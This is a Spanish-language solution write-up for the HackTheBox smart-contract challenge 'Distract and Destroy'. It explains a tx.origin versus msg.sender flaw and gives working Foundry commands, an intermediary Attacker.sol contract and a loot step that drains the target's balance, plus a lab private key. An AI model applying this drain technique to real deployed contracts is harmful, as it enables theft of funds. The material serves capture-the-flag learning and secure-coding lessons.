# Distract and Destroy - Solución Completa

## Resumen del Reto

Este es un reto de blockchain/smart contracts de HackTheBox con dificultad "VERY EASY".

## Análisis de Vulnerabilidad

### Contratos Involucrados

1. **Setup.sol**: Contrato de inicialización
   - Despliega el contrato Creature con 10 wei
   - `isSolved()`: Retorna true si `address(TARGET).balance == 0`

2. **Creature.sol**: Contrato objetivo
   - `lifePoints`: Comienza en 1000
   - `aggro`: Primera dirección que ataca
   - `attack(uint256 _damage)`: Función vulnerable
   - `loot()`: Permite drenar el balance si lifePoints == 0
   - `_isOffBalance()`: Retorna `tx.origin != msg.sender`

### Vulnerabilidad: tx.origin vs msg.sender

La función `attack()` solo causa daño cuando:
1. `_isOffBalance()` retorna true (tx.origin != msg.sender)
2. `aggro != msg.sender`

```solidity
function attack(uint256 _damage) external {
    if (aggro == address(0)) {
        aggro = msg.sender;  // Primera llamada establece aggro
    }

    if (_isOffBalance() && aggro != msg.sender) {
        lifePoints -= _damage;  // ¡Daño efectivo!
    } else {
        lifePoints -= 0;  // Sin daño
    }
}

function _isOffBalance() private view returns (bool) {
    return tx.origin != msg.sender;  // ¡VULNERABILIDAD!
}
```

## Estrategia de Explotación

### Explicación Técnica

- **tx.origin**: Es la dirección EOA (Externally Owned Account) que inició la transacción original
- **msg.sender**: Es la dirección que hizo la llamada inmediata (puede ser un contrato)

### Pasos para Explotar

1. **Establecer Aggro (desde EOA directamente)**
   ```bash
   cast send $TARGET "attack(uint256)" 0 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
   ```
   - tx.origin = Nuestra EOA
   - msg.sender = Nuestra EOA
   - Resultado: aggro = Nuestra EOA, sin daño (tx.origin == msg.sender)

2. **Desplegar Contrato Attacker**
   ```bash
   forge create src/Attacker.sol:Attacker \
     --rpc-url $RPC_URL \
     --private-key $PRIVATE_KEY \
     --constructor-args $TARGET
   ```

3. **Atacar a través del Contrato Attacker (desde EOA)**
   ```bash
   cast send $ATTACKER_ADDRESS "attackCreature(uint256)" 1000 \
     --rpc-url $RPC_URL \
     --private-key $PRIVATE_KEY
   ```
   - tx.origin = Nuestra EOA
   - msg.sender = Contrato Attacker (cuando llama a Creature.attack())
   - aggro = Nuestra EOA
   - Resultado: ✓ tx.origin != msg.sender ✓ aggro != msg.sender
   - **¡Daño efectivo de 1000!**

4. **Saquear el Contrato**
   ```bash
   cast send $TARGET "loot()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
   ```
   - Drena los 10 wei del balance del contrato

5. **Obtener la Flag**
   ```bash
   curl http://94.237.57.211:55233/flag
   ```

## Archivos Creados

### Attacker.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Creature} from "./Creature.sol";

contract Attacker {
    Creature public creature;
    
    constructor(address _creatureAddress) {
        creature = Creature(_creatureAddress);
    }
    
    // Llamado desde EOA, crea la condición tx.origin != msg.sender
    function attackCreature(uint256 _damage) external {
        creature.attack(_damage);
    }
    
    function lootCreature() external {
        creature.loot();
        payable(msg.sender).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
```

### exploit.py
Script Python completo usando web3.py para automatizar todo el exploit.

## Información de Conexión

```
RPC URL: http://94.237.57.211:55233/rpc
Private Key: 0x24558ad5bb725e98b30b53f07f99bfa50e461b9c9bed9b2bd1d4c0a0e1088046
Address: 0x9cc969e27cAa0c20b29D76da90abF3a4287a6FF3
Target Address (Creature): 0xB15bb82Ef521368A0506B9C345a8F2ff771130fB
Setup Address: 0xEA2b9987B149e121fA8AA4a120cb1d4953026De5
```

## Herramientas Utilizadas

- **Foundry**: Framework de desarrollo Ethereum
  - `forge`: Compilar y desplegar contratos
  - `cast`: Interactuar con contratos
- **web3.py**: Librería Python para blockchain
- **megatools**: Descargar archivos del reto
- **curl**: Interactuar con API HTTP

## Lecciones Aprendidas

### tx.origin vs msg.sender

- **NUNCA usar tx.origin para autorización**
- tx.origin siempre es una EOA
- msg.sender puede ser un contrato
- Esta diferencia permite ataques de phishing y bypass de controles

### Mejora del Código Vulnerable

```solidity
// MAL - Vulnerable
function _isOffBalance() private view returns (bool) {
    return tx.origin != msg.sender;
}

// BIEN - Seguro
function _isOffBalance() private view returns (bool) {
    return msg.sender != originalOwner;
}
```

## Estado Final

La instancia expiró después de obtener la información de conexión, pero la solución está completa y lista para ejecutarse cuando se inicie una nueva instancia.

### Para ejecutar cuando la instancia esté activa:

```bash
# Opción 1: Script Python automatizado
python3 exploit.py

# Opción 2: Comandos manuales con cast
# Ver connection_details.txt para los pasos detallados
```

## Conclusión

Este reto demuestra una vulnerabilidad común pero crítica en smart contracts: el mal uso de `tx.origin`. La solución requiere entender la diferencia entre `tx.origin` y `msg.sender`, y usar un contrato intermediario para explotar esta diferencia.

**Dificultad**: VERY EASY (correcta)
**Tiempo estimado**: 15-30 minutos con experiencia en Solidity
**Concepto clave**: Diferencia entre tx.origin y msg.sender
